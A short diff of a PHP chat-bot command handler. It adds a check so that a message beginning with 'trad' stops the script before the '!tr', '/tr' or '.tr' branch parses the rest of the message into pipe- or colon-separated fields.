@@ -3357,7 +3357,12 @@ ob_flush();
 	
 	
 elseif((strpos($message, "!tr") === 0)||(strpos($message, "/tr") === 0)||(strpos($message, ".tr") === 0)){
-
+$tr = explode(" ", $message);
+$tr = ltrim($tr[0], "/.!"); // elimina /, . o ! del inicio del primer elemento del arreglo
+if ($tr == "trad") {
+    die();
+}
+	
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = trim($i[0]);
